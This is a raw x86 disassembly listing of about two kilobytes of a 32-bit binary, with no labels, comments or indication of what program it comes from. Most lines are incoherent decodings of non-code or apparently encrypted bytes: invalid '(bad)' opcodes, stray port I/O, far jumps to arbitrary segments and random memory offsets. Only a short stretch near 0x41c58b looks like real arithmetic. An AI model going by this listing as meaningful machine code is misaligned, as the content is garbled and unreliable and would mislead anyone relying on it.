  41c4d5:	sub    BYTE PTR [edi+0x73f1e55],ch
  41c4db:	inc    ecx
  41c4dc:	push   0xffffffd3
  41c4de:	outs   dx,BYTE PTR ds:[esi]
  41c4df:	push   0x63
  41c4e1:	dec    ecx
  41c4e2:	or     eax,0x49ff75f4
  41c4e7:	sahf   
  41c4e8:	jle    0x41c473
  41c4ea:	pop    ebp
  41c4eb:	arpl   WORD PTR [edx+edi*8-0x275eb83e],cx
  41c4f2:	and    al,0xc0
  41c4f4:	or     al,0x50
  41c4f6:	jbe    0x41c543
  41c4f8:	or     eax,ebp
  41c4fa:	ds nop
  41c4fc:	pop    ss
  41c4fd:	adc    ah,BYTE PTR [eax]
  41c4ff:	popa   
  41c500:	dec    eax
  41c501:	jns    0x41c4fa
  41c503:	mov    WORD PTR [edi+edi*8+0x65753264],?
  41c50a:	mov    DWORD PTR ds:0x90f1d8ce,ebp
  41c510:	push   edi
  41c511:	dec    ebp
  41c512:	loop   0x41c4da
  41c514:	int3   
  41c515:	in     al,dx
  41c516:	test   eax,0xb5a41d5a
  41c51b:	adc    esi,ebx
  41c51d:	std    
  41c51e:	add    al,0x89
  41c520:	in     al,dx
  41c521:	pusha  
  41c522:	jge    0x41c56b
  41c524:	inc    edx
  41c525:	cmp    ecx,edi
  41c527:	in     eax,0xd5
  41c529:	sbb    esp,eax
  41c52b:	std    
  41c52c:	(bad)  
  41c52d:	and    edx,edx
  41c52f:	sub    ah,dh
  41c531:	sahf   
  41c532:	xor    BYTE PTR [ecx+0x71590553],al
  41c538:	mov    ebx,0x92555dc8
  41c53d:	push   esi
  41c53e:	mov    esp,DWORD PTR [ebx-0x2cb86c7]
  41c544:	pop    eax
  41c545:	or     dl,BYTE PTR [eax]
  41c547:	test   BYTE PTR [ebx-0x12],bh
  41c54a:	rcl    BYTE PTR [ebx-0x17],1
  41c54d:	xor    cl,ch
  41c54f:	sti    
  41c550:	in     eax,dx
  41c551:	nop
  41c552:	daa    
  41c553:	enter  0xd0d2,0x39
  41c557:	int3   
  41c558:	inc    esi
  41c559:	stc    
  41c55a:	cwde   
  41c55b:	psadbw mm7,QWORD PTR [edi+ebx*1]
  41c55f:	jo     0x41c59e
  41c561:	int    0x82
  41c563:	jb     0x41c521
  41c565:	jo     0x41c50d
  41c567:	pop    esp
  41c568:	mov    ecx,0x561f41ed
  41c56d:	test   eax,0xb9fe0a79
  41c572:	scas   al,BYTE PTR es:[edi]
  41c573:	retf   
  41c574:	test   BYTE PTR [eax],cl
  41c576:	sti    
  41c577:	mov    eax,0x2c53564f
  41c57c:	mov    dh,0xac
  41c57e:	pop    ds
  41c57f:	add    BYTE PTR [ecx+0x7a],bh
  41c582:	in     eax,0x33
  41c584:	enter  0xd033,0x2b
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	inc    esp
  41c5d1:	jns    0x41c562
  41c5d3:	add    eax,0x7a7de1fe
  41c5d8:	or     bl,BYTE PTR [edi+0x7a]
  41c5db:	jp     0x41c5f4
  41c5dd:	aad    0x20
  41c5df:	test   DWORD PTR [ecx-0x29],esp
  41c5e2:	push   cs
  41c5e3:	out    dx,al
  41c5e4:	lock mov al,0xe3
  41c5e7:	pop    esp
  41c5e8:	mov    ah,0xf5
  41c5ea:	into   
  41c5eb:	fidiv  DWORD PTR [eax+0x688becf1]
  41c5f1:	xchg   edx,eax
  41c5f2:	mov    ah,BYTE PTR [ecx+0x531394c]
  41c5f8:	ror    BYTE PTR [ebp-0x69],cl
  41c5fb:	jmp    0x13d7e7db
  41c600:	jae    0x41c630
  41c602:	mov    ah,bl
  41c604:	popa   
  41c605:	test   BYTE PTR [ebp-0x57825da6],bl
  41c60b:	push   eax
  41c60c:	sbb    ebp,DWORD PTR [edi]
  41c60e:	call   0xaaf4:0x3ca91e9e
  41c615:	clc    
  41c616:	repz push esp
  41c618:	mov    DWORD PTR [edx-0x4af83416],esp
  41c61e:	cmp    eax,0x3dbd8ec8
  41c623:	stc    
  41c624:	jmp    0xd52b:0x9da86641
  41c62b:	push   cs
  41c62c:	and    BYTE PTR [ecx+0x27885e9c],bl
  41c632:	or     dh,BYTE PTR [eax+0x8]
  41c635:	(bad)  
  41c636:	sar    BYTE PTR [ebx+edx*8],cl
  41c639:	xlat   BYTE PTR ds:[ebx]
  41c63a:	and    al,BYTE PTR [esi-0x310d6050]
  41c640:	xor    BYTE PTR [ebx+0x3fc551b3],ah
  41c646:	fsubr  DWORD PTR [ecx]
  41c648:	aad    0x54
  41c64a:	scas   eax,DWORD PTR es:[edi]
  41c64b:	pusha  
  41c64c:	dec    edi
  41c64d:	pop    edx
  41c64e:	dec    esp
  41c64f:	sub    eax,0xda6bbd09
  41c654:	mov    edx,0xefd82914
  41c659:	clc    
  41c65a:	lds    ecx,FWORD PTR [ebp-0x73]
  41c65d:	push   ebp
  41c65e:	inc    esp
  41c65f:	inc    ebp
  41c660:	stos   BYTE PTR es:[edi],al
  41c661:	pop    esp
  41c662:	cmp    dh,BYTE PTR [eax+eiz*4-0x36]
  41c666:	add    DWORD PTR ds:0x9f23f04a,ecx
  41c66c:	repz rol DWORD PTR [ebp-0x49e59e2],1
  41c673:	cmp    BYTE PTR [ebp+0x32],ch
  41c676:	(bad)  
  41c677:	aad    0x5
  41c679:	sub    eax,0x990f442
  41c67e:	sbb    ecx,ebp
  41c680:	push   ebp
  41c681:	jmp    0x238f:0x22db813
  41c688:	(bad)  
  41c689:	jmp    DWORD PTR [edi+0x7f2a7b8f]
  41c68f:	in     eax,0x9c
  41c691:	fsubr  QWORD PTR [esp+ebp*1+0x12dedde0]
  41c698:	jno    0x41c61f
  41c69a:	pop    ss
  41c69b:	out    dx,eax
  41c69c:	adc    cl,bh
  41c69e:	sbb    al,0x8b
  41c6a0:	xor    ah,BYTE PTR [ebp+0x5c]
  41c6a3:	lods   al,BYTE PTR ds:[esi]
  41c6a4:	adc    bl,BYTE PTR [ecx-0x7b]
  41c6a7:	xchg   esp,eax
  41c6a8:	dec    esp
  41c6a9:	dec    ebx
  41c6aa:	inc    edi
  41c6ab:	std    
  41c6ac:	pusha  
  41c6ad:	sti    
  41c6ae:	xchg   esp,eax
  41c6af:	fnstsw WORD PTR [eax+0x7d]
  41c6b2:	(bad)  
  41c6b3:	cld    
  41c6b4:	or     eax,0x3e2f568f
  41c6b9:	scas   eax,DWORD PTR es:[edi]
  41c6ba:	cdq    
  41c6bb:	cdq    
  41c6bc:	xor    al,0x57
  41c6be:	enter  0xf311,0x72
  41c6c2:	in     al,dx
  41c6c3:	mov    ebx,0x3c7fb65e
  41c6c8:	jge    0x41c70d
  41c6ca:	mov    al,0xd7
  41c6cc:	inc    ebx
  41c6cd:	jge    0x41c746
  41c6cf:	inc    ecx
  41c6d0:	xchg   edi,eax
  41c6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6d2:	and    bh,BYTE PTR cs:[ebp+0x4f287910]
  41c6d9:	inc    edi
  41c6da:	test   al,0x45
  41c6dc:	dec    esp
  41c6dd:	jecxz  0x41c66e
  41c6df:	stos   DWORD PTR es:[edi],eax
  41c6e0:	pop    ds
  41c6e1:	pop    edx
  41c6e2:	mov    BYTE PTR [ecx+0x30],dh
  41c6e5:	outs   dx,BYTE PTR ds:[esi]
  41c6e6:	(bad)  
  41c6e7:	jns    0x41c70b
  41c6e9:	mov    edx,0xde11d844
  41c6ee:	aas    
  41c6ef:	in     al,0xbc
  41c6f1:	xchg   BYTE PTR [esi+0x101c981c],cl
  41c6f7:	jecxz  0x41c6ee
  41c6f9:	xchg   BYTE PTR [edx-0x4f],dh
  41c6fc:	shr    DWORD PTR [ecx+0x52],cl
  41c6ff:	mov    edx,0x5d3dcced
  41c704:	xor    cl,ah
  41c706:	inc    esp
  41c707:	lea    ecx,[eax-0x7a6cbf44]
  41c70d:	aas    
  41c70e:	pop    es
  41c70f:	in     al,dx
  41c710:	dec    edi
  41c711:	popf   
  41c712:	jecxz  0x41c6a4
  41c714:	pop    es
  41c715:	jg     0x41c6e4
  41c717:	mov    esi,0xb8f456db
  41c71c:	push   ss
  41c71d:	retf   
  41c71e:	inc    ebx
  41c71f:	shr    DWORD PTR [ecx-0x7d5b38e0],0xe3
  41c726:	adc    edi,ecx
  41c728:	lods   eax,DWORD PTR ds:[esi]
  41c729:	xchg   esp,eax
  41c72a:	nop
  41c72b:	push   ebp
  41c72c:	cmp    bl,BYTE PTR [edx+edi*1-0x6f]
  41c730:	and    BYTE PTR ds:0xa3105922,0xb3
  41c737:	sbb    ebp,DWORD PTR [edi]
  41c739:	sbb    DWORD PTR [esi],esp
  41c73b:	popf   
  41c73c:	mov    eax,0x59e09e5f
  41c741:	dec    ecx
  41c742:	lods   eax,DWORD PTR ds:[esi]
  41c743:	inc    edi
  41c744:	es pop edx
  41c746:	xchg   esp,eax
  41c747:	sbb    BYTE PTR [eax],0x33
  41c74a:	(bad)
  41c74f:	mov    ?,WORD PTR [eax]
  41c751:	hlt    
  41c752:	leave  
  41c753:	mov    cl,0xf1
  41c755:	call   DWORD PTR [ecx-0x6a]
  41c758:	adc    BYTE PTR [esi+eax*2],ch
  41c75b:	jno    0x41c757
  41c75d:	push   0xb63b66a
  41c762:	in     al,0x4
  41c764:	push   0xfc7cd3a7
  41c769:	sub    cl,ch
  41c76b:	push   0xe37ac5e2
  41c770:	add    dh,BYTE PTR [edi]
  41c772:	adc    edx,DWORD PTR [edx+0x75d92a06]
  41c778:	outs   dx,BYTE PTR ds:[esi]
  41c779:	int    0x91
  41c77b:	loop   0x41c78d
  41c77d:	ficom  DWORD PTR [edx-0x77f1da3c]
  41c783:	sti    
  41c784:	xor    BYTE PTR [ebp+0x36],ah
  41c787:	pop    ecx
  41c788:	ins    DWORD PTR es:[edi],dx
  41c789:	(bad)  
  41c78a:	push   0x48
  41c78c:	and    DWORD PTR [ecx-0x6e321c2d],eax
  41c792:	outs   dx,BYTE PTR ds:[esi]
  41c793:	sbb    BYTE PTR [edi],bl
  41c795:	xchg   BYTE PTR [ecx],bh
  41c797:	call   0x66f07081
  41c79c:	addr16 pop ecx
  41c79e:	dec    edx
  41c79f:	data16 mov ch,0x35
  41c7a2:	and    DWORD PTR [esi+0x4e],esp
  41c7a5:	xchg   BYTE PTR [esi+0x1],bh
  41c7a8:	adc    eax,0x7a6b35fa
  41c7ad:	push   es
  41c7ae:	iret   
  41c7af:	ficom  DWORD PTR ds:0xc3ea9e74
  41c7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7b6:	outs   dx,BYTE PTR ds:[esi]
  41c7b7:	out    0x56,al
  41c7b9:	in     al,0x74
  41c7bb:	push   edx
  41c7bc:	sbb    ebp,eax
  41c7be:	or     cl,bl
  41c7c0:	out    0xe7,eax
  41c7c2:	jg     0x41c753
  41c7c4:	test   al,0x6f
  41c7c6:	mov    bh,0xf1
  41c7c8:	inc    esp
  41c7c9:	xchg   ebx,eax
  41c7ca:	leave  
  41c7cb:	sub    ch,BYTE PTR [edi]
  41c7cd:	out    0xe9,eax
  41c7cf:	sbb    al,0x76
  41c7d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7d2:	xchg   edi,eax
  41c7d3:	repnz mov al,0x89
  41c7d6:	and    ecx,DWORD PTR [edx+0x5ed87f6b]
  41c7dc:	mov    ebp,0xcc8fcbd6
  41c7e1:	dec    ebp
  41c7e2:	inc    edx
  41c7e3:	sbb    bl,BYTE PTR [edi-0x61]
  41c7e6:	cli    
  41c7e7:	mov    bl,BYTE PTR [ebp-0x33f1eace]
  41c7ed:	shr    DWORD PTR [esi+0x72],cl
  41c7f0:	push   ebx
  41c7f1:	out    0x39,al
  41c7f3:	(bad)  
  41c7f4:	mov    al,ds:0x2d66796
  41c7f9:	(bad)  
  41c7fa:	adc    ah,ah
  41c7fc:	and    eax,0xfbf05330
  41c801:	sub    bh,BYTE PTR [edx]
  41c803:	sub    BYTE PTR [ebx],bl
  41c805:	pusha  
  41c806:	inc    edi
  41c807:	shl    DWORD PTR [ebx+0xbdaa98c],0x19
  41c80e:	mov    ds:0xe67f12bd,eax
  41c813:	or     ah,BYTE PTR [edi+0x42b310af]
  41c819:	push   cs
  41c81a:	mov    ch,0x26
  41c81c:	xchg   ebp,eax
  41c81d:	jb     0x41c843
  41c81f:	pop    ebp
  41c820:	lahf   
  41c821:	and    eax,0x5f9a07d0
  41c826:	add    eax,0x5d7138d7
  41c82b:	sbb    al,0x7c
  41c82d:	mov    al,ds:0x9446f31d
  41c832:	sti    
  41c833:	push   0xeb619fc3
  41c838:	leave  
  41c839:	push   ebx
  41c83a:	sbb    bl,dl
  41c83c:	add    al,0x12
  41c83e:	push   es
  41c83f:	shl    BYTE PTR [eax-0x3d],1
  41c842:	pop    esi
  41c843:	(bad)  
  41c844:	mov    esi,0xc7d8243e
  41c849:	lods   eax,DWORD PTR ds:[esi]
  41c84a:	nop
  41c84b:	add    al,dl
  41c84d:	mov    dh,0xc5
  41c84f:	inc    edi
  41c850:	push   ebx
  41c851:	pop    esp
  41c852:	nop
  41c853:	push   ecx
  41c854:	outs   dx,BYTE PTR ds:[esi]
  41c855:	out    0x31,eax
  41c857:	xchg   edi,eax
  41c858:	fcmovbe st,st(5)
  41c85a:	sub    al,0xe8
  41c85c:	ret    
  41c85d:	iret   
  41c85e:	pusha  
  41c85f:	mov    WORD PTR [ebx-0x7f909c94],?
  41c865:	jne    0x41c83a
  41c867:	aam    0x81
  41c869:	xor    BYTE PTR [eax],dh
  41c86b:	push   edx
  41c86c:	arpl   WORD PTR [eax+0x23],cx
  41c86f:	or     al,0xf2
  41c871:	sub    ecx,ebp
  41c873:	rol    edi,cl
  41c875:	adc    ch,al
  41c877:	dec    esp
  41c878:	push   ebp
  41c879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c87a:	lea    ebx,cs:[edx-0xce68f20]
  41c881:	arpl   si,ax
  41c883:	lea    ebx,[ebx+ebx*8-0x6d]
  41c887:	xor    eax,0xd057f17d
  41c88c:	dec    esi
  41c88d:	in     al,dx
  41c88e:	add    eax,0x534e51c9
  41c893:	jmp    0xd088:0x249d48ba
  41c89a:	mov    ebx,0x5ede2d7f
  41c89f:	rcl    esi,1
  41c8a1:	not    BYTE PTR [ecx+0x75]
  41c8a4:	push   ss
  41c8a5:	test   al,0x58
  41c8a7:	mov    ds:0x36607400,eax
  41c8ac:	aaa    
  41c8ad:	rcl    DWORD PTR ds:0xb1a829b1,cl
  41c8b3:	loop   0x41c8b8
  41c8b5:	into   
  41c8b6:	xor    esp,esi
  41c8b8:	xor    DWORD PTR cs:[edx],ebp
  41c8bb:	frstor [edx+eiz*8+0x5d2e4e62]
  41c8c2:	shl    DWORD PTR [ecx+0x1a],0x9f
  41c8c6:	inc    edx
  41c8c7:	adc    dh,BYTE PTR [ecx+ecx*4]
  41c8ca:	cmp    eax,0xd543badc
  41c8cf:	add    DWORD PTR [ecx],esp
  41c8d1:	cmp    edi,DWORD PTR [esi+edi*4]
  41c8d4:	into   
  41c8d5:	in     eax,0x9e
  41c8d7:	test   edi,ebp
  41c8d9:	inc    ebx
  41c8da:	dec    ebx
  41c8db:	add    DWORD PTR [edx+0x3e],esp
  41c8de:	pop    ecx
  41c8df:	sub    BYTE PTR [edi+0xe],dl
  41c8e2:	test   eax,0x25b0f1c0
  41c8e7:	add    dl,bh
  41c8e9:	imul   esp,DWORD PTR [edx+0x12],0x77
  41c8ed:	es dec esp
  41c8ef:	fcomp  DWORD PTR [esi+0x40e3a857]
  41c8f5:	push   cs
  41c8f6:	enter  0x20c8,0xac
  41c8fa:	mov    esp,0x20e7ff7a
  41c8ff:	push   ebp
  41c900:	mov    ch,0x8e
  41c902:	fcompp 
  41c904:	xchg   esi,eax
  41c905:	jnp    0x41c96e
  41c907:	push   eax
  41c908:	sub    eax,0x54caca55
  41c90d:	mov    al,BYTE PTR [edi]
  41c90f:	loope  0x41c917
  41c911:	sub    DWORD PTR [esi-0x31],edi
  41c914:	or     ch,BYTE PTR [eax-0x3aabaadf]
  41c91a:	xor    eax,0x4de8835b
  41c91f:	nop
  41c920:	aaa    
  41c921:	jne    0x41c8ec
  41c923:	or     DWORD PTR [ecx],esp
  41c925:	add    DWORD PTR [ecx-0x15],esi
  41c928:	pop    es
  41c929:	inc    ebx
  41c92a:	daa    
  41c92b:	jo     0x41c9a1
  41c92d:	xor    BYTE PTR [edi],0x52
  41c930:	xor    eax,0x6bc12ab4
  41c935:	pop    esp
  41c936:	lock scas al,BYTE PTR es:[edi]
  41c938:	xor    eax,0xc49ed03a
  41c93d:	fs pushf 
  41c93f:	mov    edx,0x8a51055f
  41c944:	pop    edx
  41c945:	jmp    0xba61:0x30e883a4
  41c94c:	jl     0x41c93c
  41c94e:	pop    ss
  41c94f:	xor    eax,0x74d56e9b
  41c954:	xchg   edx,eax
  41c955:	addr16 mov esp,ebx
  41c958:	xor    ebp,DWORD PTR [ecx-0x7231b620]
  41c95e:	add    DWORD PTR [edx+0x44],edx
  41c961:	push   0x3
  41c963:	popf   
  41c964:	sub    dh,BYTE PTR [ecx+esi*8+0x3a83c9fa]
  41c96b:	jno    0x41c911
  41c96d:	jle    0x41c96c
  41c96f:	in     eax,0xcd
  41c971:	hlt    
  41c972:	mov    dh,0x8c
  41c974:	or     eax,0xede121a
  41c979:	or     al,0x3c
  41c97b:	add    dl,ah
  41c97d:	or     BYTE PTR [ebx-0x2e],0xb1
  41c981:	leave  
  41c982:	sub    al,0x1
  41c984:	xchg   edi,eax
  41c985:	inc    edx
  41c986:	cwde   
  41c987:	repz or DWORD PTR [edi],esi
  41c98a:	lahf   
  41c98b:	mov    cl,BYTE PTR [edx-0x6]
  41c98e:	inc    ecx
  41c98f:	jmp    0x485a971c
  41c994:	jge    0x41c95f
  41c996:	fst    DWORD PTR [ebp-0x47]
  41c999:	test   DWORD PTR [ecx],ecx
  41c99b:	and    dh,BYTE PTR [edx-0x620f2826]
  41c9a1:	mov    esi,0x231e4140
  41c9a6:	push   esp
  41c9a7:	(bad)  
  41c9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9a9:	mov    eax,ds:0xfe9bd048
  41c9ae:	lods   al,BYTE PTR ds:[esi]
  41c9af:	ds mov cl,bh
  41c9b2:	sub    BYTE PTR [edi],dl
  41c9b4:	jae    0x41c961
  41c9b6:	les    esp,FWORD PTR [edi]
  41c9b8:	xchg   ecx,eax
  41c9b9:	rcr    cl,0x65
  41c9bc:	cmp    eax,0x1f0a07a
  41c9c1:	aam    0xed
  41c9c3:	loope  0x41c95f
  41c9c5:	sbb    ebp,DWORD PTR [edi]
  41c9c7:	scas   eax,DWORD PTR es:[edi]
  41c9c8:	xor    eax,0xf7bef40
  41c9cd:	out    0x9e,eax
  41c9cf:	mov    DWORD PTR [esi],esi
  41c9d1:	loop   0x41c9e2
  41c9d3:	jne    0x41c9d0
  41c9d5:	cdq    
  41c9d6:	je     0x41c9b2
  41c9d8:	ret    0x79e6
  41c9db:	dec    esi
  41c9dc:	mov    DWORD PTR [ecx+0x6e67d638],eax
  41c9e2:	jg     0x41c984
  41c9e4:	xor    ah,ah
  41c9e6:	in     eax,0x71
  41c9e8:	scas   al,BYTE PTR es:[edi]
  41c9e9:	inc    eax
  41c9ea:	mov    al,ds:0x5447bf34
  41c9ef:	mov    bh,0xfb
  41c9f1:	add    eax,0xadd0053a
  41c9f6:	cs dec ecx
  41c9f8:	mov    ebx,0x6250efa3
  41c9fd:	pop    esp
  41c9fe:	ret    0x7b98
  41ca01:	sub    eax,0x4a4fb1df
  41ca06:	mov    dl,0xe9
  41ca08:	xchg   ebp,eax
  41ca09:	push   esi
  41ca0a:	je     0x41ca17
  41ca0c:	call   FWORD PTR [eax+0x49512611]
  41ca12:	or     ebp,DWORD PTR [ecx+0x3d58de19]
  41ca18:	imul   ecx,DWORD PTR [ebx-0x25],0x18
  41ca1c:	or     BYTE PTR [esi-0x7d],al
  41ca1f:	add    eax,0x7fffd7f5
  41ca24:	call   0xefb76a6e
  41ca29:	(bad)  
  41ca2a:	aad    0x86
  41ca2c:	(bad)  
  41ca2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca2f:	repnz push eax
  41ca31:	(bad)  
  41ca32:	ins    BYTE PTR es:[edi],dx
  41ca33:	dec    esp
  41ca34:	jp     0x41ca5c
  41ca36:	jns    0x41ca14
  41ca38:	lods   eax,DWORD PTR ds:[esi]
  41ca39:	jp     0x41ca76
  41ca3b:	jle    0x41c9eb
  41ca3d:	js     0x41ca1e
  41ca3f:	out    dx,al
  41ca40:	imul   edi,DWORD PTR [eax+edi*2+0x5e],0xa35c6288
  41ca48:	test   al,0x31
  41ca4a:	imul   ebp,DWORD PTR [ebp+0xf],0x77
  41ca4e:	push   ebx
  41ca4f:	(bad)  
  41ca50:	sbb    DWORD PTR [esi-0x21e05a05],ebp
  41ca56:	pop    eax
  41ca57:	scas   al,BYTE PTR es:[edi]
  41ca58:	cmp    al,0x1a
  41ca5a:	(bad)  
  41ca5b:	int    0xb6
  41ca5d:	mov    al,ds:0x2ce4a9a
  41ca62:	push   ds
  41ca63:	add    eax,DWORD PTR [ebp+0x35]
  41ca66:	jmp    0x41ca0a
  41ca68:	pop    esp
  41ca69:	inc    eax
  41ca6a:	arpl   WORD PTR [ecx+0x4d6f39aa],cx
  41ca70:	or     al,0x2d
  41ca72:	push   ebp
  41ca73:	xchg   ecx,eax
  41ca74:	push   edi
  41ca75:	aas    
  41ca76:	pop    edi
  41ca77:	rcr    BYTE PTR [ecx-0x42952f0e],0xee
  41ca7e:	cli    
  41ca7f:	(bad)  
  41ca80:	cli    
  41ca81:	pusha  
  41ca82:	outs   dx,DWORD PTR ds:[esi]
  41ca83:	pushf  
  41ca84:	mov    ds:0xfb9c7aea,eax
  41ca89:	sbb    BYTE PTR [ebp-0xe],al
  41ca8c:	inc    edx
  41ca8d:	mov    BYTE PTR [esi+0x5c95c96c],cl
  41ca93:	imul   edi,ecx,0x1a1176b
  41ca99:	jle    0x41ca8b
  41ca9b:	arpl   WORD PTR [esp+eiz*8-0x672a0892],sp
  41caa2:	int    0x55
  41caa4:	pusha  
  41caa5:	and    dl,BYTE PTR [ebx+0x50]
  41caa8:	and    al,ah
  41caaa:	in     al,0x10
  41caac:	pop    edx
  41caad:	outs   dx,BYTE PTR ds:[esi]
  41caae:	mov    DWORD PTR [esp+eax*2+0x388441ec],0x2afe915c
  41cab9:	jo     0x41ca43
  41cabb:	xchg   ebp,eax
  41cabc:	add    eax,0x8154ae34
  41cac1:	cmp    DWORD PTR [ebp+0x4f3869d1],esi
  41cac7:	retf   0x68f7
  41caca:	jbe    0x41ca61
  41cacc:	shl    BYTE PTR [esi],cl
  41cace:	test   DWORD PTR [esi+0xe],esp
  41cad1:	or     al,0xc3
  41cad3:	inc    esp
  41cad4:	jg     0x41cb0b
  41cad6:	sub    al,0x31
  41cad8:	xchg   ebp,eax
  41cad9:	fdivr  DWORD PTR [ecx+eiz*8+0x4193a710]
  41cae0:	(bad)  
  41cae1:	jp     0x41cb5a
  41cae3:	add    BYTE PTR [ecx+0x9],bl
  41cae6:	cs jmp 0x41caa1
  41cae9:	dec    esp
  41caeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caec:	push   ss
  41caed:	fnstsw WORD PTR [eax-0x4244cb6a]
  41caf3:	push   edx
  41caf4:	xchg   ebx,eax
  41caf5:	and    cl,BYTE PTR [ecx+0x4a]
  41caf8:	dec    esi
  41caf9:	aam    0xb6
  41cafb:	sbb    cl,BYTE PTR [eax+edi*2]
  41cafe:	mov    esp,0x8ecd5d8b
  41cb03:	loope  0x41cb80
  41cb05:	inc    esi
  41cb06:	cwde   
  41cb07:	das    
  41cb08:	fs in  eax,dx
  41cb0a:	xor    al,0xc
  41cb0c:	neg    DWORD PTR [ebx]
  41cb0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb0f:	mov    al,ds:0x65041138
  41cb14:	mov    al,ds:0x84686b38
  41cb19:	ret    
  41cb1a:	push   esi
  41cb1b:	add    eax,0xfe8d78a9
  41cb20:	call   0x12755bab
  41cb25:	stc    
  41cb26:	call   0x931a:0xbd55c0a1
  41cb2d:	push   edi
  41cb2e:	sub    esp,esp
  41cb30:	adc    al,BYTE PTR [edx]
  41cb32:	pop    esi
  41cb33:	test   eax,esp
  41cb35:	and    DWORD PTR [edx],ebp
  41cb37:	mov    ebp,0xe57b71b2
  41cb3c:	and    al,0xda
  41cb3e:	int    0xa6
  41cb40:	inc    ebp
  41cb41:	call   0x52e87c21
  41cb46:	add    BYTE PTR [ebx+0x3e],cl
  41cb49:	inc    ebx
  41cb4a:	rcr    dh,1
  41cb4c:	fst    DWORD PTR [ecx+0x72257097]
  41cb52:	xchg   ebp,eax
  41cb53:	inc    esi
  41cb54:	sub    eax,0xaf73679d
  41cb59:	mov    esi,0xbf9dfab6
  41cb5e:	test   BYTE PTR [edi-0x15934f45],bl
  41cb64:	mov    edi,0x3cbec212
  41cb69:	mov    ch,0x4b
  41cb6b:	add    DWORD PTR [edx+0x14],ebx
  41cb6e:	xor    eax,0xb31dabfc
  41cb73:	add    eax,0xde9b8cba
  41cb78:	adc    eax,0x4049062b
  41cb7d:	mov    al,ds:0xeffc9593
  41cb82:	hlt    
  41cb83:	popf   
  41cb84:	jp     0x41cb43
  41cb86:	(bad)  
  41cb87:	popw   ss
  41cb89:	and    eax,0x7e7e0620
  41cb8e:	out    0xee,eax
  41cb90:	pop    eax
  41cb91:	dec    ebx
  41cb92:	dec    esp
  41cb93:	dec    ebp
  41cb94:	jbe    0x41cbcc
  41cb96:	push   ebp
  41cb97:	and    BYTE PTR [ebx],ch
  41cb99:	sbb    DWORD PTR cs:[bx+si],ebx
  41cb9d:	inc    esi
  41cb9e:	ja     0x41cb4b
  41cba0:	push   es
  41cba1:	sub    eax,0xc41be583
  41cba6:	shl    DWORD PTR [ebx+0x2b34a50a],cl
  41cbac:	test   eax,0xa1287375
  41cbb1:	add    ch,0x4b
  41cbb4:	cld    
  41cbb5:	or     eax,0xee463cb2
  41cbba:	xchg   ebp,eax
  41cbbb:	add    eax,0xabe9cafe
  41cbc0:	jmp    0x4e3619ba
  41cbc5:	sti    
  41cbc6:	mov    bl,0xd5
  41cbc8:	iret   
  41cbc9:	out    dx,eax
  41cbca:	jnp    0x41cb68
  41cbcc:	pop    ss
  41cbcd:	repz je 0x41cb61
  41cbd0:	adc    DWORD PTR [ebx-0x5b5d70ea],esp
  41cbd6:	jmp    0xd9f2:0x2e19acd5
  41cbdd:	and    al,0x8b
  41cbdf:	add    al,0x86
  41cbe1:	dec    ebx
  41cbe2:	out    dx,eax
  41cbe3:	sub    eax,0xa44f8750
  41cbe8:	iret   
  41cbe9:	popa   
  41cbea:	sahf   
  41cbeb:	lahf   
  41cbec:	mov    fs:0x60eb369e,eax
  41cbf2:	mov    dh,0x3f
  41cbf4:	ins    DWORD PTR es:[edi],dx
  41cbf5:	gs fsub st(0),st
  41cbf8:	es lock pop eax
  41cbfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cbfc:	stos   DWORD PTR es:[edi],eax
  41cbfd:	add    esp,ecx
  41cbff:	mov    WORD PTR [edx+0x51],ds
  41cc02:	dec    ch
  41cc04:	scas   al,BYTE PTR es:[edi]
  41cc05:	aad    0x18
  41cc07:	ins    DWORD PTR es:[edi],dx
  41cc08:	inc    ecx
  41cc09:	sub    eax,0xf5dc7cd4
  41cc0e:	mov    eax,ds:0xca23a3a6
  41cc13:	stc    
  41cc14:	mov    eax,0x83917471
  41cc19:	mov    DWORD PTR [edx-0x5a099c12],eax
  41cc1f:	jle    0x41cba1
  41cc21:	je     0x41cc9f
  41cc23:	jl     0x41cc9e
  41cc25:	mov    edx,0x9d70fd37
  41cc2a:	jae    0x41cc85
  41cc2c:	xor    DWORD PTR [eax-0x36],esp
  41cc2f:	adc    edx,esp
  41cc31:	xchg   esi,eax
  41cc32:	cmp    DWORD PTR [eax+0x30],ebx
  41cc35:	aas    
  41cc36:	lods   eax,DWORD PTR ds:[esi]
  41cc37:	rcl    bl,0x68
  41cc3a:	and    eax,0xb5d1f3ab
  41cc3f:	push   ebx
  41cc40:	(bad)  
  41cc41:	jmp    0xddc2:0x4dddb1dc
  41cc48:	sbb    BYTE PTR [eax],ah
  41cc4a:	in     eax,dx
  41cc4b:	add    ebp,DWORD PTR [ebx]
  41cc4d:	push   0x70e7f5cb
  41cc52:	mov    edx,0x135282b7
  41cc57:	inc    ebx
